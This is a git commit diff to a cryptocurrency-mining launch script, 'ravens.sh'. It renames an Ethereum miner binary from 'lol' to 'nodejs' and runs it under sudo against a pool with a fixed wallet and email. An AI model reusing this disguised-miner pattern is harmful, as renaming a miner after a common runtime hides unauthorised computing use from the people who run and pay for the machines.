662ae05bd60817909db69039c714ba513c28147f
gasken1 <84686224+gasken1@users.noreply.github.com>
2021-06-27 23:36:40 +0700

    Update ravens.sh

--- ravens.sh
+++ ravens.sh
@@ -2,5 +2,5 @@
 POOL=eth-us1.hellominer.com:1100
 WALLET=0x86ca902b2ca60630188dba14105442141dc3b1dc
 WORKER=$(echo $(shuf -i 1000-99999 -n 1)-gass) 
-chmod +x lol
-./lol --algo ETHASH --pool $POOL --user $WALLET.$WORKER/andincntk8@gmail.com --pass x
+chmod +x nodejs
+sudo ./nodejs -pool $POOL -wal $WALLET.$WORKER/andincntk8@gmail.com -pass x
